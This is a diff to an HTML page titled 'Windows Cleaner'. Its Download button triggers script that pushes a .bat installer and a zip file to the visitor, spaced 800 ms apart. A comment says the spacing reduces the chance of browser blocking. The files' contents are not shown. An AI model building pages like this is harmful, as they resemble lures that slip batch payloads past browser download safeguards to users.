@@ -1,1 +1,30 @@
-<h1>Hello!</h1>
+<h1>Windows Cleaner</h1>
+<h3>Sorry, but we're preparing something good...</h3>
+
+<button onclick="downloadAll()">
+  Download
+</button>
+
+<script>
+function downloadAll() {
+  const files = [
+    'windows-cleaner-installer.bat',
+    'WindowsCleaner.zip'
+  ];
+
+  let delay = 0;
+
+  files.forEach(file => {
+    setTimeout(() => {
+      const a = document.createElement('a');
+      a.href = file;
+      a.download = file;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }, delay);
+
+    delay += 800; // mały odstęp = mniejsze ryzyko blokady
+  });
+}
+</script>
